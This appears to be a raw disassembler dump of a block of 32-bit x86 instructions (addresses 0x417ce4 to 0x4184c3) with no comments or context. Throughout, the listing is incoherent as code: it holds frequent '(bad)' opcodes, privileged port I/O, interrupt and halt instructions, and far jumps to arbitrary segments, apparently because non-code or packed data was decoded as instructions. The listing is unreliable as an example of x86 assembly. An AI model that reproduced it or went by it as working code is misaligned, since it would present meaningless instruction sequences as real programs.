  417ce4:	lods   eax,DWORD PTR ds:[esi]
  417ce5:	pushf  
  417ce6:	xchg   ecx,eax
  417ce7:	repz add esi,ebx
  417cea:	xchg   ecx,eax
  417ceb:	call   0xa0a4be0e
  417cf0:	in     eax,0x63
  417cf2:	cli    
  417cf3:	or     ebx,edx
  417cf5:	ins    DWORD PTR es:[edi],dx
  417cf6:	jecxz  0x417d23
  417cf8:	or     eax,0xa8f17e89
  417cfd:	outs   dx,DWORD PTR ds:[esi]
  417cfe:	in     al,0x11
  417d00:	cmp    ebp,DWORD PTR [edx+0x73]
  417d03:	fimul  DWORD PTR [ebp+0x5d]
  417d06:	dec    edx
  417d07:	sbb    eax,0xfedd2a7b
  417d0c:	ins    BYTE PTR es:[edi],dx
  417d0d:	loope  0x417ccc
  417d0f:	cmc    
  417d10:	adc    eax,0xb5fbe47f
  417d15:	and    eax,0xc92367e8
  417d1a:	xchg   ebx,eax
  417d1b:	ins    BYTE PTR es:[edi],dx
  417d1c:	iret   
  417d1d:	das    
  417d1e:	xor    ebx,esi
  417d20:	fwait
  417d21:	(bad)  
  417d22:	dec    esi
  417d24:	jle    0x417d1a
  417d26:	ss sub ecx,esp
  417d29:	mov    cl,0x2e
  417d2c:	add    esi,DWORD PTR ss:[ecx-0x6e]
  417d30:	mov    ch,0x31
  417d32:	inc    ebx
  417d33:	pushf  
  417d34:	pop    esp
  417d35:	inc    eax
  417d36:	sub    BYTE PTR [edi+eiz*2],dh
  417d39:	sub    eax,0x8f9e48de
  417d3e:	add    cl,ah
  417d40:	retf   
  417d41:	jae    0x417d20
  417d43:	int3   
  417d44:	in     al,dx
  417d45:	outs   dx,DWORD PTR gs:[esi]
  417d47:	push   es
  417d48:	pop    ss
  417d49:	andnps xmm3,XMMWORD PTR [edx+0x49]
  417d4d:	pop    esp
  417d4e:	popf   
  417d4f:	adc    al,0x7a
  417d51:	dec    ebx
  417d52:	mov    al,0xfc
  417d54:	adc    DWORD PTR [ebp+0x12],edx
  417d57:	ins    BYTE PTR es:[edi],dx
  417d58:	and    esp,DWORD PTR [edi+0x75]
  417d5b:	jne    0x417dd0
  417d5d:	mov    bh,0xf0
  417d5f:	sar    DWORD PTR [edx+edi*4+0x112a05bd],1
  417d66:	or     cl,BYTE PTR [eax+ecx*8+0x71]
  417d6a:	(bad)  
  417d6b:	jno    0x417ced
  417d6d:	ins    BYTE PTR es:[edi],dx
  417d6e:	pop    edi
  417d6f:	test   BYTE PTR [edx],0x7f
  417d72:	pop    esi
  417d73:	xchg   esp,eax
  417d74:	aaa    
  417d75:	jg     0x417d61
  417d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d78:	mov    al,0xb0
  417d7a:	lds    esi,FWORD PTR [ebx+0x45e7a0aa]
  417d80:	jno    0x417d15
  417d82:	loope  0x417d9f
  417d84:	push   ebp
  417d85:	test   DWORD PTR [esi-0x37],ebp
  417d88:	dec    ecx
  417d89:	jp     0x417e08
  417d8b:	rcr    DWORD PTR [edx+0xfd10615],0x68
  417d92:	push   es
  417d93:	xor    eax,0xc0e711e6
  417d98:	mov    eax,0xb0a4ec1e
  417d9d:	pop    ecx
  417d9e:	and    eax,0x1dbc6564
  417da3:	jle    0x417dc0
  417da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417da6:	loope  0x417daf
  417da8:	pop    ebp
  417da9:	arpl   WORD PTR [ebx-0x3d406c28],di
  417daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417db0:	xor    DWORD PTR [eax-0x6f919f2e],0x1
  417db7:	fldcw  WORD PTR [ebx-0x15bc84dc]
  417dbd:	test   dh,ch
  417dbf:	jge    0x417e31
  417dc1:	inc    edx
  417dc2:	sbb    DWORD PTR [esi],ecx
  417dc4:	pop    esp
  417dc5:	in     eax,0xca
  417dc7:	pop    es
  417dc8:	test   dh,0xe4
  417dcb:	call   0x8ba1:0x43fe453
  417dd2:	or     al,0xe2
  417dd4:	stc    
  417dd5:	sub    al,BYTE PTR [edi+0x78760c76]
  417ddb:	clc    
  417ddc:	add    esi,DWORD PTR [esi-0x559657b]
  417de2:	call   0xc2bf:0xdc167282
  417de9:	gs or  eax,0x8c4b1c80
  417def:	pop    ds
  417df0:	fs jnp 0x417d97
  417df3:	out    0x7d,al
  417df5:	sub    cl,BYTE PTR [esi]
  417df7:	rol    DWORD PTR [edi],0x2b
  417dfa:	push   edi
  417dfb:	ror    ah,cl
  417dfd:	mov    dl,0xc4
  417dff:	pop    esp
  417e00:	stos   DWORD PTR es:[edi],eax
  417e01:	jbe    0x417daa
  417e03:	not    ebp
  417e05:	sub    BYTE PTR [ebp+0x6],dl
  417e08:	add    al,0x7a
  417e0a:	mov    esp,DWORD PTR [edi+0x12]
  417e0d:	jbe    0x417e26
  417e0f:	inc    DWORD PTR [ebx-0x59012299]
  417e15:	das    
  417e16:	push   ss
  417e17:	es jle 0x417daf
  417e1a:	enter  0xb0d6,0x7e
  417e1e:	pop    esp
  417e1f:	pop    ds
  417e20:	scas   eax,DWORD PTR es:[edi]
  417e21:	adc    edx,DWORD PTR [esi+0x794f5ccf]
  417e27:	push   ss
  417e28:	mov    BYTE PTR [esi+0x73bff9f3],dl
  417e2e:	xchg   edi,eax
  417e2f:	lea    ebx,[edx-0x3e1d0ad5]
  417e35:	fistp  DWORD PTR [ebp-0x12]
  417e38:	pop    ds
  417e39:	jns    0x417e83
  417e3b:	ror    dh,1
  417e3d:	outs   dx,BYTE PTR ds:[esi]
  417e3e:	add    eax,0x4277ca08
  417e43:	dec    esp
  417e44:	icebp  
  417e45:	xchg   edi,eax
  417e46:	mov    bl,BYTE PTR [esi+esi*8+0x255b3523]
  417e4d:	jmp    0x417ebc
  417e4f:	imul   ebp,DWORD PTR [ebp+0x40dd2e1c],0x38395fc0
  417e59:	test   DWORD PTR [esi-0x691d50c9],ebx
  417e5f:	scas   eax,DWORD PTR es:[edi]
  417e60:	jmp    0x2eef:0x714f1572
  417e67:	js     0x417ed1
  417e69:	sbb    ebp,DWORD PTR [eax-0x15]
  417e6c:	xchg   ebx,eax
  417e6d:	dec    eax
  417e6e:	aaa    
  417e6f:	cmp    esp,eax
  417e71:	jo     0x417e8c
  417e73:	sbb    al,0xc4
  417e75:	popa   
  417e76:	cmp    bl,cl
  417e78:	jns    0x417e15
  417e7a:	in     al,dx
  417e7b:	movsx  esp,BYTE PTR [esi-0x750908c2]
  417e82:	ins    DWORD PTR es:[edi],dx
  417e83:	lahf   
  417e84:	dec    edx
  417e85:	not    DWORD PTR [esi]
  417e87:	(bad)  
  417e88:	mov    edi,0xa94dd8bc
  417e8d:	jbe    0x417e28
  417e8f:	jecxz  0x417ee8
  417e91:	es test eax,0x976da0e
  417e97:	add    ebp,DWORD PTR [edx+0x2cf52360]
  417e9d:	sti    
  417e9e:	xlat   BYTE PTR ds:[ebx]
  417e9f:	pop    ebx
  417ea0:	sbb    BYTE PTR [ebp+0x671e1d6b],bl
  417ea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ea7:	int3   
  417ea8:	sub    eax,0x9bfab0f7
  417ead:	add    eax,0xaaa2bce9
  417eb2:	inc    edi
  417eb3:	and    eax,edi
  417eb5:	dec    esi
  417eb6:	dec    esp
  417eb7:	(bad)  
  417eb9:	sub    al,0x34
  417ebb:	imul   edx,DWORD PTR [edi+0x1b8f95ee],0x3bc09a70
  417ec5:	push   edx
  417ec6:	inc    ebx
  417ec7:	pop    es
  417ec8:	std    
  417ec9:	cmp    BYTE PTR [ecx+ecx*8],dl
  417ecc:	and    ebx,DWORD PTR [ecx-0x13a1fdd6]
  417ed2:	mov    esp,0x774ecbb
  417ed7:	(bad)  
  417ed9:	pop    ebp
  417eda:	cmp    eax,0xea456f70
  417edf:	push   esp
  417ee0:	xor    edx,DWORD PTR [edi+0x1b]
  417ee3:	mov    DWORD PTR [edx],0x4dd40d35
  417ee9:	and    BYTE PTR [ebx],0x5c
  417eec:	adc    al,0x66
  417eee:	iret   
  417eef:	ror    BYTE PTR [ecx],0x58
  417ef2:	icebp  
  417ef3:	dec    edi
  417ef4:	push   0x6a
  417ef6:	sub    eax,esp
  417ef8:	(bad)  
  417ef9:	and    al,BYTE PTR [ecx+0x57]
  417efc:	push   esi
  417efd:	loope  0x417f37
  417eff:	popf   
  417f00:	dec    ebx
  417f01:	jae    0x417f21
  417f03:	cs push edi
  417f05:	cmp    al,0x34
  417f07:	add    eax,0x962e395c
  417f0c:	xchg   esp,eax
  417f0d:	cmp    DWORD PTR [ecx],edx
  417f0f:	and    ecx,eax
  417f11:	add    DWORD PTR [esi+0x2b],0x19f54468
  417f18:	dec    ebx
  417f19:	push   edx
  417f1a:	adc    al,0xf4
  417f1c:	sub    al,0xcf
  417f1e:	push   ds
  417f1f:	ret    
  417f20:	xor    DWORD PTR [ecx],ebp
  417f22:	push   eax
  417f23:	fstp   QWORD PTR [esi-0x59]
  417f26:	lods   al,BYTE PTR ds:[esi]
  417f27:	das    
  417f28:	bound  ebp,QWORD PTR [edi+0x5eb9aeaf]
  417f2e:	ror    DWORD PTR [edx],1
  417f30:	xchg   ch,dh
  417f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f33:	pop    ds
  417f34:	in     eax,dx
  417f35:	call   0xd846:0x7c8a964
  417f3c:	or     BYTE PTR [esi],dl
  417f3e:	fwait
  417f3f:	push   ebx
  417f40:	jl     0x417ec8
  417f42:	sbb    BYTE PTR [eax+0x2528a3bb],0x31
  417f49:	fs gs pop es
  417f4c:	rcr    DWORD PTR [ebp+0x1],1
  417f4f:	shl    BYTE PTR [esi],0x9e
  417f52:	adc    ch,BYTE PTR [ecx+0x57838c92]
  417f58:	int    0x54
  417f5a:	ds push ss
  417f5c:	push   ebx
  417f5d:	sahf   
  417f5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f5f:	sub    edi,DWORD PTR [eax-0x7961cae4]
  417f65:	jns    0x417f84
  417f67:	fwait
  417f68:	sub    al,0x59
  417f6a:	push   ecx
  417f6b:	cmc    
  417f6c:	es call 0x6e74:0xc3e2ad27
  417f74:	mov    dh,0x1f
  417f76:	and    BYTE PTR [ecx+0x67],al
  417f79:	xor    BYTE PTR [edi],ah
  417f7b:	ret    
  417f7c:	dec    eax
  417f7d:	mov    dl,al
  417f7f:	into   
  417f80:	fsub   DWORD PTR [ebp+0x49]
  417f83:	enter  0x65f4,0xb0
  417f87:	or     esi,DWORD PTR ds:0xca828262
  417f8d:	fisttp QWORD PTR [ecx+0x1ce044ec]
  417f93:	jl     0x417f1c
  417f95:	xor    eax,0xab8bd7ba
  417f9a:	fsubr  QWORD PTR [ecx]
  417f9c:	mov    ds:0xcd3d35f3,eax
  417fa1:	pop    edi
  417fa2:	xor    eax,0x30938aa7
  417fa7:	add    al,0x3a
  417fa9:	repnz cdq 
  417fab:	inc    ecx
  417fac:	pop    edx
  417fad:	pushf  
  417fae:	push   eax
  417faf:	sbb    DWORD PTR [ecx],0x92b3aca3
  417fb5:	pop    ss
  417fb6:	dec    ebx
  417fb7:	loop   0x417f50
  417fb9:	cld    
  417fba:	push   ebx
  417fbb:	inc    esp
  417fbc:	jp     0x417f60
  417fbe:	popf   
  417fbf:	add    DWORD PTR [eax-0xca92398],ebp
  417fc5:	mov    bl,0xe6
  417fc7:	add    eax,0xab59dc52
  417fcc:	sti    
  417fcd:	(bad)  
  417fce:	scas   al,BYTE PTR es:[di]
  417fd0:	mov    al,BYTE PTR [ebp-0x13]
  417fd3:	xchg   BYTE PTR [eax],dh
  417fd5:	xchg   esi,eax
  417fd6:	fild   WORD PTR [eax-0x53]
  417fd9:	mov    esi,0x2a904412
  417fde:	mov    bl,0x25
  417fe0:	xchg   ebp,eax
  417fe1:	sub    DWORD PTR [ecx],edi
  417fe3:	jae    0x417fa8
  417fe5:	ret    0x665c
  417fe8:	popf   
  417fe9:	pop    cx
  417feb:	and    esi,0xffffffd0
  417fee:	push   ebp
  417fef:	jle    0x417fc9
  417ff1:	xchg   ebp,eax
  417ff2:	mov    edx,0x6c036b7f
  417ff7:	pusha  
  417ff8:	sbb    DWORD PTR es:[ebx+0x156abf98],eax
  417fff:	sub    al,0x8f
  418001:	(bad)  
  418002:	sub    esi,DWORD PTR [ecx+0x2f]
  418005:	or     dh,BYTE PTR [edi]
  418007:	pop    edx
  418008:	dec    esp
  418009:	pop    ecx
  41800a:	dec    ecx
  41800b:	sub    dl,dh
  41800d:	call   0x96672baa
  418012:	ret    
  418013:	daa    
  418014:	sub    eax,0x3d819a41
  418019:	pop    edx
  41801a:	mov    ds:0x48a3301b,eax
  41801f:	add    esi,DWORD PTR [ecx]
  418021:	popf   
  418022:	lods   al,BYTE PTR ds:[esi]
  418023:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418024:	mov    dh,BYTE PTR [ebp-0x6b]
  418027:	loope  0x417fb0
  418029:	shl    BYTE PTR [edi+eax*8+0x7a424477],0x7e
  418031:	dec    ebp
  418032:	mov    ecx,DWORD PTR [edx+0x4a4ea325]
  418038:	jl     0x41808b
  41803a:	pop    edi
  41803b:	test   eax,0x3021e6e9
  418040:	fcmovne st,st(1)
  418042:	enter  0xc52b,0x93
  418046:	push   edx
  418047:	in     al,dx
  418048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418049:	pusha  
  41804a:	push   ebx
  41804b:	mov    edi,0x89fdcb73
  418050:	aaa    
  418051:	push   ebx
  418052:	call   0xd1fd00f7
  418057:	int3   
  418058:	bound  edi,QWORD PTR ds:0x52ae0021
  41805e:	(bad)  
  41805f:	clc    
  418060:	mov    esp,0x9c774cac
  418065:	aas    
  418066:	addr16 int 0x16
  418069:	(bad)  
  41806a:	aaa    
  41806b:	mov    ebx,0xab09bc72
  418070:	xchg   ebx,eax
  418071:	sbb    DWORD PTR [edx+ecx*8],esp
  418074:	mov    ds:0x35594747,al
  418079:	je     0x418063
  41807b:	or     eax,0x6854a294
  418080:	or     al,0x46
  418082:	cmp    al,0xce
  418084:	out    dx,eax
  418085:	test   al,0xcb
  418087:	xor    bh,BYTE PTR [eax]
  418089:	iret   
  41808a:	sbb    BYTE PTR [ecx-0x2b],ah
  41808d:	fxch   st(0)
  41808f:	dec    eax
  418090:	xor    al,0xef
  418092:	mov    ebp,eax
  418094:	mov    bl,0x15
  418096:	ds repnz inc esi
  418099:	jmp    DWORD PTR [edi+ebp*8]
  41809c:	nop
  41809d:	inc    esp
  41809e:	push   edi
  41809f:	add    eax,0x2ca98a42
  4180a4:	cld    
  4180a5:	les    edi,FWORD PTR [esi+0x389a92f7]
  4180ab:	cmp    cl,bh
  4180ad:	pop    ecx
  4180ae:	pop    es
  4180af:	ins    BYTE PTR es:[edi],dx
  4180b0:	aas    
  4180b1:	mov    edx,0xa7db6dba
  4180b6:	(bad)  [ecx+eiz*4]
  4180b9:	stc    
  4180ba:	push   eax
  4180bb:	sahf   
  4180bc:	jge    0x41808b
  4180be:	and    eax,0xd437c80d
  4180c3:	sub    esi,DWORD PTR [edi+0x11]
  4180c6:	and    BYTE PTR ds:0x69660ba9,0x35
  4180cd:	pop    es
  4180ce:	call   0xeaf5:0x6fe4f202
  4180d5:	(bad)  
  4180d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180d7:	or     al,0xd6
  4180d9:	or     DWORD PTR [edx+0x7e40a73e],ebp
  4180df:	jns    0x41810b
  4180e1:	and    bl,BYTE PTR ds:0x534c8096
  4180e7:	sub    edx,DWORD PTR [ebp+0x53fadb36]
  4180ed:	call   0x21c85bd3
  4180f2:	pop    edi
  4180f3:	mov    edi,DWORD PTR ds:0x7987e650
  4180f9:	ret    0x8a77
  4180fc:	sub    eax,0xed50659c
  418101:	or     DWORD PTR [ecx-0x3a3db131],ecx
  418107:	mov    bh,0x4c
  418109:	jne    0x418110
  41810b:	fiadd  DWORD PTR [edx]
  41810d:	mov    bl,0x49
  41810f:	aaa    
  418110:	out    0xd7,eax
  418112:	fs mov bh,0x15
  418115:	out    0xca,eax
  418117:	inc    esi
  418118:	sub    DWORD PTR [edx],esp
  41811a:	inc    esp
  41811b:	dec    BYTE PTR [edx-0x65]
  41811e:	dec    esi
  41811f:	gs clc 
  418121:	mov    cl,0x33
  418123:	jle    0x418178
  418125:	add    al,0xc7
  418127:	mov    esi,0x506bc958
  41812c:	test   eax,0x7519ec4d
  418131:	ins    DWORD PTR es:[edi],dx
  418132:	xchg   esp,eax
  418133:	push   es
  418134:	inc    ecx
  418135:	fucom  st(2)
  418137:	fisubr DWORD PTR [ebx-0x48ad4e90]
  41813d:	js     0x418183
  41813f:	xlat   BYTE PTR ds:[ebx]
  418140:	mov    esi,0x20cd008e
  418145:	(bad)  
  418146:	std    
  418147:	sub    al,BYTE PTR [edx]
  418149:	out    dx,eax
  41814a:	or     dl,BYTE PTR [ecx-0x55]
  41814d:	add    DWORD PTR [eax-0x3e247881],ebp
  418153:	dec    ebp
  418154:	enter  0xfc33,0x99
  418158:	pop    esi
  418159:	jecxz  0x41810f
  41815b:	out    dx,eax
  41815c:	enter  0xdf91,0x69
  418160:	mov    al,ds:0x8f73db9e
  418165:	bound  esp,QWORD PTR [esi-0x193c0a0a]
  41816b:	imul   al
  41816d:	lahf   
  41816e:	lahf   
  41816f:	cmp    eax,0xfdd69253
  418174:	hlt    
  418175:	xchg   edx,eax
  418176:	xchg   ecx,eax
  418177:	sub    BYTE PTR [eax],bh
  418179:	addr16 daa 
  41817b:	aad    0x3c
  41817d:	mov    es,WORD PTR [edi-0x6c]
  418180:	push   edi
  418181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418182:	(bad)  
  418183:	sub    DWORD PTR [esi-0x103f8072],ebx
  418189:	and    edi,DWORD PTR ds:0x294ca59e
  41818f:	inc    esi
  418190:	cbw    
  418192:	mov    ch,0xea
  418194:	mov    dl,0xd6
  418196:	jmp    0x8fe2048e
  41819b:	sub    DWORD PTR [esi-0x3947219f],edi
  4181a1:	adc    BYTE PTR [ecx+0x6c66dbd1],cl
  4181a7:	sub    eax,0x276ed345
  4181ac:	(bad)
  4181af:	xchg   ebp,eax
  4181b0:	popf   
  4181b1:	retf   
  4181b2:	sub    al,0xa9
  4181b4:	dec    eax
  4181b5:	test   BYTE PTR [ecx-0x251bf058],dh
  4181bb:	mov    ch,BYTE PTR [esi]
  4181bd:	pop    edx
  4181be:	push   ebp
  4181bf:	in     eax,0x7b
  4181c1:	mov    al,cl
  4181c3:	sar    DWORD PTR [ecx],1
  4181c5:	sbb    eax,0xa767ae6e
  4181ca:	rcl    bh,cl
  4181cc:	int3   
  4181cd:	test   BYTE PTR [eax],bl
  4181cf:	lods   eax,DWORD PTR ds:[esi]
  4181d0:	xchg   esi,eax
  4181d1:	inc    eax
  4181d2:	mov    edi,0x8dfe1980
  4181d7:	adc    eax,DWORD PTR [edx+0x46d592b0]
  4181dd:	out    0xb4,al
  4181df:	addps  xmm7,XMMWORD PTR [ebp-0x1d]
  4181e3:	jge    0x418171
  4181e5:	xor    al,0x65
  4181e7:	inc    ebx
  4181e8:	neg    BYTE PTR [eax]
  4181ea:	cmc    
  4181eb:	sahf   
  4181ec:	loop   0x4181f7
  4181ee:	jecxz  0x41826e
  4181f0:	push   0x3fa747cf
  4181f5:	mov    bh,0xa5
  4181f7:	enter  0x7548,0xb2
  4181fb:	cmp    BYTE PTR [eax],ah
  4181fd:	mov    ah,0x7e
  4181ff:	rol    BYTE PTR [edi+0x5cb5e263],1
  418205:	cmp    al,al
  418207:	lock adc BYTE PTR [ebx-0x4874c69a],cl
  41820e:	into   
  41820f:	pop    es
  418210:	xor    ebp,eax
  418212:	or     al,0x2b
  418214:	pop    esi
  418215:	clc    
  418216:	(bad)  
  418217:	pop    edx
  418218:	jp     0x418289
  41821a:	mov    WORD PTR [edx-0x23],?
  41821d:	outs   dx,BYTE PTR ds:[esi]
  41821e:	das    
  41821f:	ret    0xe300
  418222:	push   ecx
  418223:	stc    
  418224:	xor    DWORD PTR [eax+0x56976375],ebx
  41822a:	cmp    bh,BYTE PTR [ebp-0x2c270d86]
  418230:	dec    ebp
  418231:	and    al,0xab
  418233:	clc    
  418234:	repnz sahf 
  418236:	sbb    eax,0xe9b1f3d
  41823b:	mov    ah,0xab
  41823d:	sub    eax,0xf1665e1f
  418242:	lods   al,BYTE PTR ds:[esi]
  418243:	push   eax
  418244:	je     0x41823f
  418246:	xchg   ebp,eax
  418247:	push   cs
  418248:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418249:	inc    ebp
  41824a:	retf   0xdff0
  41824d:	or     al,0x5b
  41824f:	jno    0x418223
  418251:	mov    esi,DWORD PTR [esi]
  418253:	pop    esp
  418254:	cmp    dh,BYTE PTR [ebx]
  418256:	sti    
  418257:	or     DWORD PTR ds:0xfd188912,esp
  41825d:	mov    esp,0x3ed6511
  418262:	fsubr  st,st(6)
  418264:	out    dx,al
  418265:	mov    edx,0x3035a4a1
  41826a:	adc    DWORD PTR [edi],esi
  41826c:	mov    al,ds:0xc99c7aa
  418271:	dec    esp
  418272:	jne    0x4182d0
  418274:	or     al,0x61
  418276:	outs   dx,DWORD PTR ds:[esi]
  418277:	dec    ebx
  418278:	imul   esp,DWORD PTR [edx+0x1a15e21d],0x5c1d4e08
  418282:	jp     0x418215
  418284:	jg     0x418243
  418286:	retf   0x3c9e
  418289:	aam    0xef
  41828b:	sbb    eax,0x7bce9a68
  418290:	mov    ?,ecx
  418292:	pop    esi
  418293:	mov    al,ds:0x86518939
  418298:	mov    eax,ds:0xc79f8ef1
  41829d:	xor    dh,BYTE PTR [esi]
  41829f:	retf   0x2bd6
  4182a2:	push   0x754d0652
  4182a7:	mov    bh,0xb8
  4182a9:	arpl   WORD PTR [edx],dx
  4182ab:	aam    0x4e
  4182ad:	sbb    al,BYTE PTR [ebp+0x8]
  4182b0:	adc    ch,0xcc
  4182b3:	out    0xe2,eax
  4182b5:	cwde   
  4182b6:	gs aam 0x10
  4182b9:	stos   BYTE PTR es:[edi],al
  4182ba:	into   
  4182bb:	sar    BYTE PTR [edx+0xb],0x73
  4182bf:	dec    esp
  4182c0:	mov    ds:0x2afd73af,eax
  4182c5:	loop   0x4182aa
  4182c7:	ret    0xbeb4
  4182ca:	sbb    eax,0xed91556a
  4182cf:	jns    0x4182ac
  4182d1:	(bad)  
  4182d3:	xchg   esi,eax
  4182d5:	sub    esi,ebp
  4182d7:	inc    ebp
  4182d8:	add    DWORD PTR [ecx-0x44],ebx
  4182db:	loop   0x4182e5
  4182dd:	(bad)  
  4182de:	into   
  4182df:	xchg   esi,eax
  4182e0:	mov    edi,0xbb40f0ac
  4182e5:	jne    0x418329
  4182e7:	imul   ebx,eax,0x18
  4182ea:	pop    eax
  4182eb:	mov    esi,0x830f511
  4182f0:	push   ecx
  4182f1:	fs or  ch,0xa3
  4182f5:	dec    eax
  4182f6:	sub    ebp,0xbb38717d
  4182fc:	pushf  
  4182fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182fe:	dec    BYTE PTR [ebp+0x34552f23]
  418304:	sub    DWORD PTR [edi-0x3389df1e],ebx
  41830a:	mov    cs,ebp
  41830c:	or     eax,0x947beee0
  418311:	(bad)  
  418312:	xchg   ebp,eax
  418313:	clc    
  418314:	into   
  418315:	cwde   
  418316:	ins    BYTE PTR es:[edi],dx
  418317:	adc    edx,DWORD PTR [ebx+0x4e]
  41831a:	mov    ecx,0xaa7329a4
  41831f:	adc    eax,esp
  418321:	int    0x46
  418323:	aad    0x2a
  418325:	(bad)  
  418326:	push   ecx
  418327:	and    bh,BYTE PTR [ecx+0x2]
  41832a:	ja     0x41835f
  41832c:	mov    esp,0x74323d1b
  418331:	leave  
  418332:	fisttp WORD PTR [edx]
  418334:	lods   eax,DWORD PTR ds:[esi]
  418335:	jmp    FWORD PTR [eax]
  418337:	retf   0xe76b
  41833a:	and    edx,edx
  41833c:	mov    eax,ds:0xf42b6f61
  418341:	xor    al,0xf
  418343:	jns    0x418375
  418345:	mov    cl,0xa6
  418347:	(bad)  
  418348:	loopne 0x418358
  41834a:	inc    edx
  41834b:	test   eax,0x6d1a8e53
  418350:	inc    ebx
  418351:	(bad)  
  418352:	jnp    0x418321
  418354:	xchg   DWORD PTR [edi+0x47],eax
  418357:	mov    esi,0xd506e777
  41835c:	int    0x4f
  41835e:	adc    esi,DWORD PTR [ebx+0x3b878bec]
  418364:	js     0x4183b4
  418366:	pop    dx
  418368:	shl    DWORD PTR [edi],cl
  41836a:	sub    DWORD PTR [edi],edx
  41836c:	imul   ecx,DWORD PTR [ecx-0x15],0xb9a61ab7
  418373:	xchg   edi,eax
  418374:	mov    dh,0xdd
  418376:	sbb    dl,ah
  418378:	inc    ebp
  418379:	jb     0x4183c7
  41837b:	xchg   ecx,eax
  41837c:	inc    ebx
  41837d:	dec    ebx
  41837e:	into   
  41837f:	fcomp  DWORD PTR [ebp-0x1d24a4f1]
  418385:	(bad)  
  418386:	sbb    eax,0x45503d99
  41838b:	cli    
  41838c:	retf   
  41838d:	out    0xc6,al
  41838f:	les    ebp,FWORD PTR [ecx-0x7]
  418392:	xchg   esp,eax
  418393:	sti    
  418394:	dec    ebp
  418395:	div    BYTE PTR [edi-0x51]
  418398:	xor    cl,BYTE PTR [edi-0x6f]
  41839b:	xlat   BYTE PTR ds:[ebx]
  41839c:	and    edx,DWORD PTR [edx]
  41839e:	jne    0x41841c
  4183a0:	and    dh,cl
  4183a2:	rol    DWORD PTR [ecx-0x7e],0xfd
  4183a6:	jmp    DWORD PTR [ebx+edi*1+0x74]
  4183aa:	adc    BYTE PTR [edx-0x1fc44a57],cl
  4183b0:	jno    0x418426
  4183b2:	ins    BYTE PTR es:[edi],dx
  4183b3:	fmul   st,st(7)
  4183b5:	mov    ebx,DWORD PTR [ebp+0x37]
  4183b8:	pop    esp
  4183b9:	psubusb mm1,QWORD PTR ds:0x1a6f5111
  4183c0:	fidivr WORD PTR [edx]
  4183c2:	lods   eax,DWORD PTR ds:[esi]
  4183c3:	in     al,dx
  4183c4:	cmp    eax,0xded4fc6d
  4183c9:	lea    ebp,[ebp-0x6063acb9]
  4183cf:	cwde   
  4183d0:	ret    
  4183d1:	sbb    BYTE PTR [eax-0x7468c7e7],cl
  4183d7:	pop    edx
  4183d8:	mov    cl,0xa5
  4183da:	dec    esp
  4183db:	gs sbb al,0x5d
  4183de:	add    cl,BYTE PTR [ecx+ebp*2+0x37532834]
  4183e5:	mov    DWORD PTR [ebx+0x3dc2493f],ebp
  4183eb:	cwde   
  4183ec:	imul   DWORD PTR [ebx-0x68]
  4183ef:	mov    esi,0xd8d23445
  4183f4:	mov    cl,0xc2
  4183f6:	push   ss
  4183f7:	push   0x3b
  4183f9:	(bad)  
  4183fb:	cmc    
  4183fc:	adc    BYTE PTR ds:0x75c8bd05,bh
  418402:	sbb    DWORD PTR ds:0x99d272e9,ecx
  418408:	add    ch,BYTE PTR [edx-0x5f]
  41840b:	ret    
  41840c:	xchg   ebp,eax
  41840d:	cmp    al,0x46
  41840f:	xor    eax,edi
  418411:	jnp    0x41840f
  418413:	mov    esp,0x729a034d
  418418:	fnsave [ebx]
  41841a:	adc    al,0x95
  41841c:	stc    
  41841d:	dec    ebp
  41841e:	imul   esi,DWORD PTR [esi-0x49730227],0x51
  418425:	pop    ebp
  418426:	mov    ecx,DWORD PTR [ecx-0x5705a32]
  41842c:	push   ds
  41842d:	jp     0x418404
  41842f:	ss push eax
  418431:	push   ds
  418432:	fsubr  st,st(4)
  418434:	or     al,0x29
  418436:	dec    eax
  418437:	adc    BYTE PTR [ecx],bh
  418439:	dec    esp
  41843a:	jle    0x4184ae
  41843c:	cmp    DWORD PTR [ebx+0x14],0xb0025a57
  418443:	call   0x95d18b16
  418448:	and    BYTE PTR [ecx+0xa],dh
  41844b:	ds inc ecx
  41844d:	shr    DWORD PTR [ecx+0x5f71ae18],0xae
  418454:	fisttp QWORD PTR [edi-0x35]
  418457:	repz cld 
  418459:	(bad)  
  41845a:	out    dx,eax
  41845b:	test   BYTE PTR [ecx+0x7d],0x88
  41845f:	ins    BYTE PTR es:[edi],dx
  418460:	jmp    0x995f:0xf2c1f270
  418467:	ret    
  418468:	icebp  
  418469:	sbb    al,0x74
  41846b:	(bad)  
  41846c:	out    dx,eax
  41846d:	jle    0x4184e6
  41846f:	rep ins BYTE PTR es:[edi],dx
  418471:	mov    bl,0x8b
  418473:	sbb    ch,BYTE PTR [ebx+0x23b93d87]
  418479:	hlt    
  41847a:	or     ebx,eax
  41847c:	xchg   ebx,eax
  41847d:	jnp    0x418460
  41847f:	je     0x418435
  418481:	mov    ecx,0x55145924
  418486:	xor    ch,bl
  418488:	or     BYTE PTR [edi+edx*8+0x11e7d232],al
  41848f:	mov    al,0x24
  418491:	(bad)  
  418492:	cmc    
  418493:	dec    ecx
  418494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418495:	mul    DWORD PTR [ebx]
  418497:	stc    
  418498:	or     DWORD PTR [eax],ebx
  41849a:	mov    al,ds:0x26e3086e
  41849f:	mov    ebp,0xa975622d
  4184a4:	pop    ecx
  4184a5:	ins    BYTE PTR es:[edi],dx
  4184a6:	and    eax,0xc2230b0f
  4184ab:	jl     0x4184af
  4184ad:	popf   
  4184ae:	jmp    0x418440
  4184b0:	and    BYTE PTR [ecx-0xabb6100],dh
  4184b6:	lock cli 
  4184b8:	add    eax,0x8562cc97
  4184bd:	aas    
  4184be:	jbe    0x41848a
  4184c0:	cmc    
  4184c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c2:	push   eax
  4184c3:	out    0x62,al
